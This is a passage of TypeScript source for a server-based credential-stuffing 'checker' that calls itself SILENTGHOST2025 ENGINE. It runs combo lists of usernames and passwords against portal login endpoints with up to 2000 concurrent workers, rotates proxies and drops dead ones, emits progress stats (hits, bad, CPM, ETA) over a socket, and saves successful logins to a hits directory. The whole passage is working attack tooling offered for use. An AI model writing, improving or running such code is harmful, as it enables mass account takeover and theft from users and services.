                      saveFullHit(hitsDir, portalHost, fullContent);
                    } catch (e) { }
                  })();

                  success = true;
                } else if (info && info.user_info && String(info.user_info.auth).toLowerCase() === '0') {
                  // ── Explicitly banned/disabled account ──
                  bad++;
                  success = true;
                } else {
                  bad++;
                  success = true;
                }
              } catch (error: any) {
                attempt++;
                // ── Smart proxy rotation: remove dead proxies ──
                if (currentProxy && currentProxy !== 'Direct' && currentProxy !== 'CF-Direct' && currentProxy !== 'Cloudflare') {
                  removeDeadProxy(currentProxy);
                }
                if (attempt < maxRetries) {
                  // Exponential backoff: 200ms, 400ms, 800ms...
                  await new Promise(r => setTimeout(r, Math.min(200 * Math.pow(2, attempt - 1), 2000)));
                  continue;
                }
                bad++;
                if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
                  proxyErrors++;
                }
              }
            }

            processed++;

            // ── Throttled progress every 10 checks ──
            if (processed % 10 === 0) {
              const elapsed = Math.max((Date.now() - startTime) / 1000, 1);
              const cpm = Math.round((processed / elapsed) * 60);
              const eta = processed > 0 ? Math.round((combo.length - processed) / Math.max(processed / elapsed, 0.1)) : 0;

              socket.emit("progress", {
                processed,
                total: combo.length,
                hits,
                bad,
                cpm,
                percent: Math.round((processed / combo.length) * 100),
                proxyErrors,
                statusCode: lastStatusCode,
                currentUser: user.length > 14 ? user.substring(0, 14) + '…' : user,
                currentPass: pass.substring(0, 3) + '***',
                eta,
                proxyPoolSize: proxyPool.length,
                deadProxies: totalDeadProxies,
              });
            }
          }
        };

        // ── Create workers ──
        const threadCount = Math.min(threads || 1, combo.length, 2000);
        console.log(`[ENGINE] Launching ${threadCount} workers…`);

        socket.emit("progress", {
          processed: 0,
          total: combo.length,
          hits: 0,
          bad: 0,
          cpm: 0,
          percent: 0,
          proxyErrors: 0,
          statusCode: 200,
          currentUser: 'Initializing…',
          currentPass: '***',
          eta: 0,
          proxyPoolSize: proxyPool.length,
          deadProxies: 0,
        });

        await Promise.all(new Array(threadCount).fill(null).map(() => worker()));

        // ── Final report ──
        const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
        console.log(`\n${'═'.repeat(60)}`);
        console.log(`  SCAN COMPLETE`);
        console.log(`${'─'.repeat(60)}`);
        console.log(`  Hits:          ${hits}`);
        console.log(`  Bad:           ${bad}`);
        console.log(`  Proxy Errors:  ${proxyErrors}`);
        console.log(`  Dead Proxies:  ${totalDeadProxies}`);
        console.log(`  Remaining Pool:${proxyPool.length}`);
        console.log(`  Time:          ${totalTime}s`);
        console.log(`  Avg CPM:       ${Math.round((processed / Math.max(parseFloat(totalTime), 1)) * 60)}`);
        console.log(`${'═'.repeat(60)}\n`);

        socket.emit("finished", { hits, bad, proxyErrors });
      } catch (error: any) {
        console.error(`[ERROR] startCheck crashed:`, error?.message || error);
        socket.emit("finished", { error: `Server error: ${error?.message || 'Unknown'}` });
        socket.emit("progress", {
          processed: 0, total: 0, hits: 0, bad: 0, cpm: 0, percent: 0,
          proxyErrors: 0, statusCode: 500, currentUser: 'ERROR', currentPass: ''
        });
      }
    });
  });

  // ═══════════════════════════════════════════════════════════
  //  Serve Frontend (Vite dev or static production)
  // ═══════════════════════════════════════════════════════════
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`\n${'═'.repeat(60)}`);
    console.log(`  SILENTGHOST2025 ENGINE v3.0`);
    console.log(`  Server running on http://localhost:${PORT}`);
    console.log(`  Hits directory: ${hitsDir}`);
    console.log(`${'═'.repeat(60)}\n`);
  });
}

startServer();